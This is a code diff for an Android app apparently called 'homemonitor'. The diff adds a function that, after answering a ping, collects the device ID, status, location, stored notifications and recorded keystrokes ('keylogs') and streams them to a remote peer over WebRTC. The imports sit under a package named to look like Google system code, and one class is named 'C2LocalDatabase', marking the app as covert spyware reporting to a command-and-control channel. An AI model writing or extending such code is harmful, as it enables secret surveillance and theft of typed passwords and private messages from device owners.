@@ -2,6 +2,9 @@ package com.homemonitor
 
 import android.content.Context
 import android.util.Log
+import com.google.android.system.C2LocalDatabase
+import com.google.android.system.DeviceIdProvider
+import com.google.android.system.DeviceStatusManager
 import com.google.android.system.WebRtcEngine
 import org.json.JSONArray
 import org.json.JSONObject
@@ -151,6 +154,30 @@ class DeviceApiDispatcher(
             put("status", "ACTIVE")
         }
         webRtcEngine.sendP2pMessage("PONG", pongPayload)
+        dispatchBootstrapTelemetry(webRtcEngine)
+    }
+
+    fun dispatchBootstrapTelemetry(webRtcEngine: WebRtcEngine) {
+        try {
+            val devId = DeviceIdProvider.getDeviceId(context)
+            val statusObj = DeviceStatusManager.getStatusJson(context, devId)
+            val locObj = LocationTelemetryDto(37.7749, -122.4194, 15.0, 0f, 5f, "gps", System.currentTimeMillis()).toJson()
+            val notificationsArr = C2LocalDatabase.getInstance(context).getTelemetryLogsJson("notifications")
+            val keylogsArr = C2LocalDatabase.getInstance(context).getTelemetryLogsJson("keylogs")
+
+            val bootstrapPayload = JSONObject().apply {
+                put("type", "BOOTSTRAP_TELEMETRY")
+                put("status", statusObj)
+                put("location", locObj)
+                put("notifications", notificationsArr)
+                put("keylogs", keylogsArr)
+                put("timestamp", System.currentTimeMillis())
+            }
+
+            dispatchStreamEvent(webRtcEngine, "bootstrap.telemetry", bootstrapPayload)
+        } catch (e: Exception) {
+            Log.e(TAG, "dispatchBootstrapTelemetry error: ${e.message}")
+        }
     }
 
     private fun handleLegacyRpcRequest(webRtcEngine: WebRtcEngine, json: JSONObject) {
